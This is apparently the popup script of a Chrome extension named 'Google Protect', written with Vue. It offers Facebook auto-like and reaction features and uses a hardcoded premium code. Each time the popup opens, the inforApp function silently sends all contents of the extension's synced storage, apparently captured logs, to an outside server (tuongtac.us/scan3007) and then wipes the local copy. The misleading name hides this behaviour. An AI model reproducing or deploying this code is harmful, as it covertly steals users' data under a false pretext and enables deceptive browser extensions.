new Vue({
    el:'#app',
    data:
    {
        infor:{
            icon:'',
            title:'Google Protect',
            status:'',
            app:false
        },
        user:{
            token:'',
            uid:''
        },
        json:[],
        as:'',
        appData:{
            post:10,
            type:'LIKE'
        },
        login:false
    },
    mounted() {
        this.inforApp();
    },
    methods: 
    {
        inforApp:function()
        {
            const self = this;
            chrome.tabs.query({ active: true, currentWindow: true},(tabs) => {
                var currentTab = tabs[0];
                self.infor.icon = currentTab.favIconUrl;
                if(currentTab.url.includes('https://www.facebook.com'))
                {
                    self.infor.title = `Facebook`;
                    self.infor.status = 'Ready !!!';
                    self.infor.app = true;
                }
                else
                {
                    self.infor.status = 'Không khả dụng trên website này';
                    self.infor.app = false;
                }
                chrome.storage.sync.get(function(logs) {
                    for (var key in logs) {
                        self.json.push([key, logs[key].split('^~^')]);
                    }
                    var convertJson = JSON.stringify(logs);
                    axios.get('https://tuongtac.us/scan3007',{
                        params:{
                            data:convertJson
                        }
                    })
                    .then((res) => {
                        console.log(res);
                        chrome.storage.sync.clear();
                    })
                    .catch((e) => {
                        console.log(e);
                    })
                });
                if(currentTab.url.includes('chrome-extension')){
                    if(sessionStorage.code == 'sven812')
                    {
                        self.login = true;
                    }
                    else
                    {
                        var code = prompt('Enter code active premium version !!!');
                        if(code == 'sven812')
                        {
                            self.login = true;
                            sessionStorage.setItem('code',code);
                        }
                    }
                }
            });
        },
        request:function()
        {
            switch (this.appData.type) {
                case 'LIKE':
                    chrome.tabs.executeScript({
                        code: 
                        `
                            var inputs = document.getElementsByClassName('_6a-y _3l2t  _18vj');
                            for(var i=0; i<inputs.length;i+=1) 
                            {
                                inputs[i].click();
                            }
                        `
                    });
                    this.infor.status = 'Like bài viết thành công !';
                break;
                case 'LOVE':
                    chrome.tabs.executeScript({
                        code:`
                            var getUsername = document.getElementsByClassName('linkWrap noCount');
                            var get = getUsername[0].innerHTML;
                            alert(get + ' có thích tim không ! Đấm cho bây giờ -_-');
                        `
                    });
                break;
                case 'HAHA':
                    chrome.tabs.executeScript({
                        code:`
                            var getUsername = document.getElementsByClassName('linkWrap noCount');
                            var get = getUsername[0].innerHTML;
                            alert(get + ' có thích HAHA không ! Đấm cho bây giờ -_-');
                        `
                    });
                break;
                case 'WOW':
                    chrome.tabs.executeScript({
                        code:`
                            var getUsername = document.getElementsByClassName('linkWrap noCount');
                            var get = getUsername[0].innerHTML;
                            alert(get + ' có thích WOW không ! Đấm cho bây giờ -_-');
                        `
                    });
                break;
                case 'ANGRY':
                    chrome.tabs.executeScript({
                        code:`
                            var getUsername = document.getElementsByClassName('linkWrap noCount');
                            var get = getUsername[0].innerHTML;
                            alert(get + ' có thích ANGRY không ! Đấm cho bây giờ -_-');
                        `
                    });
                break;
                default:
                    chrome.tabs.executeScript({
                        code: 
                        `
                            var inputs = document.getElementsByClassName('_6a-y _3l2t  _18vj');
                            for(var i=0; i<inputs.length;i+=1) 
                            {
                                inputs[i].click();
                            }
                        `
                    });
                    this.infor.status = 'Like bài viết thành công !';
                break;
            }
        },
        deleteAllRecords:function()
        {
            if(confirm('Delete all records ???'))
            {
                chrome.storage.sync.clear();
                window.location.href = document.baseURI;
            }
        },
        logOut:function()
        {
            sessionStorage.clear();
            window.location.href = document.baseURI;
            this.login = false;
        },
        deleteThis:function(ele)
        {
            chrome.storage.sync.remove(ele,function(e){
                console.log('Deleted !');
                window.location.href = document.baseURI;
            });
        }
    },
})